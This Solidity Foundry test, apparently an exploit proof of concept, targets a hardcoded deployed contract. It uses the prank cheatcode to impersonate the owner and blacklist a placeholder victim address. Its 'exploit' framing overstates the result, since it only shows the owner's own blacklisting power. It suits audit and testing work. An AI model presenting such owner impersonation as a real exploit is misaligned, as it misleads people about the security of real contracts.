// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface lsl {
    function getOwner() external view returns (address);
    function blacklistAddress(address _address, bool _value) external;
    function isBlacklisted(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x401e15Af5eDB56BE940D5a16b948F9436D2944F0;
    address attacker = address(this);
    lsl internal target;
    address internal owner;
    address constant VICTIM_ADDRESS = address(0xDEADBEEF);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = lsl(TARGET);
        owner = target.getOwner();
        vm.label(owner, "Owner");
        vm.label(VICTIM_ADDRESS, "Victim");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);
                target.blacklistAddress(VICTIM_ADDRESS, true);
                vm.stopPrank();

                assertEq(target.isBlacklisted(VICTIM_ADDRESS), true);
        assertEq(target.isBlacklisted(VICTIM_ADDRESS), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

